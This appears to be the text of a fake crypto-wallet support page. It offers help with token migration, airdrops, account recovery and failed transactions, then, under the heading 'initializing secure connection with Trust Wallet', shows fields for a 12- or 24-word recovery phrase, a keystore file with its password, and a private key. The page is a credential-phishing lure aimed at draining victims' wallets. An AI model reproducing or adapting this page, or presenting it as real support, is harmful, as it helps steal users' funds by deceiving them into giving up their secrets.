Welcome
Let‘s start by connecting your wallet
By using this application you agree to the Terms of Use. Additionally, please refer to the Important Notice.

Need help? Select among the issues below to resolve your issues easily and securely

Token Migration

Resolve token migration issues across chains efficiently to protect your assets and avoid disruptions.

Claim Airdrop

Address airdrop claim issues quickly and ensure you don’t miss out on your rewards due to technical errors.

Account Recovery

Recover your account safely with our secure tools to regain full control over your wallet and assets.

Assets Recovery

Locate and restore your missing or inaccessible assets securely with our expert assistance.

Claim Issues

Resolve issues encountered during the claim process, ensuring smooth and error-free transactions.

Token Issues

Fix wallet-related token issues, including incorrect balances and missing tokens.

Synchronization

Resolve wallet synchronization errors to display accurate and real-time balances.

Transaction Errors

Fix pending or failed transactions promptly to prevent fund losses or disruptions.

Swap/Exchange Issues

Address issues encountered during token swaps or exchanges for a seamless experience.

Cross Chain Transfer

Fix errors in cross-chain transfers and ensure smooth transactions between different blockchains.

Restore Full Functionality

Restore your wallet's full functionality and resolve technical issues quickly.

Other Issues Not Listed

If your issue is not listed, get personalized support to resolve it effectively and efficiently.

initializing secure connection with Trust Wallet

Typically 12 (sometimes 24) words separated by a single space.

Several lines of text beginning with “{…}” plus the password you used for encryption.

Several lines of text containing alphanumeric characters.
